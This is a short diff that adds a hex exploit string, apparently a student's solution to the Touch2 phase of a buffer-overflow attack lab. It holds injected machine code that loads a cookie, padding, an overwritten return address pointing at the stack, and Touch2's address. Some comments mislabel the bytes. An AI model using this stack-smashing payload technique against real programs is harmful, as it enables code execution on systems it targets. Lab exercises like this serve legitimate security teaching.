@@ -1,0 +1,5 @@
+48 c7 c7 27 ff 59 23 c3 /* Address cookie */
+00 00 00 00 00 00 00 00 /* 24 bytes of buffer */
+00 00 00 00 00 00 00 00 /* 24 bytes of buffer */
+00 bf 67 55 00 00 00 00 /* Address of %rsp */
+6b 25 40 00 00 00 00 00 /* Address of Touch2 */
